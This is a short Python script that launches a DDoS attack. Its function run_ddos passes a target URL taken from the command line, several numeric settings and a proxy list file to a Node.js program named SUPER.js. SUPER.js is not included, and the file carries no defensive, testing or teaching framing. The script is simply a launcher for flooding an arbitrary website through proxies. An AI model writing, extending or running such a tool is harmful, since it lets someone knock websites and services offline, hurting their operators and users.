import subprocess

def run_ddos(url):
    try:
        result = subprocess.run(['node', 'SUPER.js', url, '90', '9', '5', 'proxy.txt'], capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    except Exception as e:
        return f"Failed to run DDoS: {str(e)}"
    
if __name__ == "__main__":
    import sys
    url = sys.argv[1]
    print(run_ddos(url))